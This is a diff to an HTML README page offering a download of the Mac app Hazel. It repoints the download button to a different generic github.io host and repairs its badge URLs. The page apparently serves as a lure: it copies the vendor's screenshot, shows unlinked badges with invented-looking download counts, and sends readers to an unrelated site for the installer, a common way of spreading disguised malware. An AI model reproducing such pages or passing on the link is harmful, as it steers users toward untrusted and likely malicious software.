@@ -6,7 +6,7 @@
 <h3>Hazel for macOS</h3>
 <p>Hazel for macOS is aimed at users who prefer rules and automation to manually cleaning and sorting files.</p>
 
-<a href="https://install-quick-mac.github.io/.github/Hazel">
+<a href="https://mac-software-install.github.io/.github/Hazel">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
@@ -16,8 +16,8 @@
 
 <a href="#"><img src="https://img.shields.io/badge/downloads-9.1k-brightgreen?style=flat" alt="downloads"/></a>
 <a href="#"><img src="https://img.shields.io/badge/version-10.0-blue?style=flat" alt="version"/></a>
-<a href="#"><img src="https://img.shields.io-badge/license-Mac%20License-lightgrey?style=flat" alt="license"/></a>
-<a href="#"><img src="https://img.shields.io-badge/platform-macOS-blue?style=flat" alt="platform"/></a>
+<a href="#"><img src="https://img.shields.io/badge/license-Mac%20License-lightgrey?style=flat" alt="license"/></a>
+<a href="#"><img src="https://img.shields.io/badge/platform-macOS-blue?style=flat" alt="platform"/></a>
 
 <img src="https://www.noodlesoft.com/kb/wp-content/uploads/main.png" width="824" alt="Screenshot"/>
 
